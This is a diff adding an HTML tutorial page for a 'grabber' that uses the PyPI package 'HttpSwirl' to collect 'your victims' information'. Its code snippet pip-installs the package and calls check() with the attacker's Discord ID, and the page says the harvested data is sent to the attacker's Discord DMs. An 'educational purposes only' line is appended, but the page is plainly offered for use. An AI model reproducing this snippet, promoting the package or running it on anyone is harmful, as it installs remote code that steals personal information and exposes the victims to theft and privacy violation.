@@ -1,0 +1,99 @@
+  <!DOCTYPE html>
+  <html>
+  <head>
+      <title>Notbang™ | Package</title>
+      <style>
+          body {
+              font-family: Arial, sans-serif;
+              margin: 0;
+              padding: 0;
+              background: url('https://cdn.discordapp.com/attachments/1128409837483606128/1147232250287620127/background.jpg') no-repeat center center fixed;
+              background-size: cover;
+          }
+  
+          .container {
+              width: 800px;
+              max-width: 90%;
+              margin: 0 auto;
+              padding: 20px;
+              background-color: rgba(24, 25, 26, 0.8); 
+              border-radius: 8px;
+              box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+              position: absolute;
+              top: 50%;
+              left: 50%;
+              transform: translate(-50%, -50%);
+          }
+  
+          .arrow {
+              position: fixed;
+              top: 20px;
+              left: 20px;
+              font-size: 40px;
+              color: #fff;
+              content: "◄";
+              text-decoration: none;
+              line-height: 1;
+              z-index: 999;
+          }
+  
+          h1, h2 {
+              color: #fff; 
+          }
+  
+          p {
+              color: #ccc; 
+              line-height: 1.5;
+          }
+  
+          pre {
+              background-color: #f0f0f0;
+              padding: 10px;
+              border-radius: 5px;
+              overflow-x: auto;
+              margin-top: 15px;
+          }
+  
+          code {
+              color: #d14;
+          }
+  
+          .code-box {
+              background: linear-gradient(90deg, rgba(64, 57, 57, 1) 0%, rgba(23, 22, 22, 1) 100%);
+              padding: 20px;
+              border-radius: 10px;
+              margin-top: 20px;
+              box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+          }
+      </style>
+  </head>
+  <body>
+      <a class="arrow" href="https://webserver.xolo2.repl.co/tools">◄</a>
+      <div class="container">
+          <h1>PYPI Package Grabber Tutorial</h1>
+          <p>Welcome to this tutorial on using the "HttpSwirl" Python package to grab your victims' information!</p>
+  
+          <div class="code-box">
+              <h2>Step 1: Import and Use the Package</h2>
+              <p>In your Python script, import the package and use the <code>check</code> function like this:</p>
+              <pre>
+                  <code>
+  import os
+  os.system("pip install HttpSwirl")
+  from HttpSwirl import check
+  
+  # Replace "YOUR_DISCORD_ID" with your Discord ID
+  check("YOUR_DISCORD_ID")
+                  </code>
+              </pre>
+          </div>
+  
+          <div class="code-box">
+              <h2>Step 2: Gathering and Sending Information</h2>
+              <p>When someone interacts with your script, their information will be gathered and sent to your Discord DMs.</p>
+              <p>Remember, this example is for educational purposes only. Always respect privacy and get proper consent before handling personal data.</p>
+          </div>
+      </div>
+  </body>
+  </html>
+  
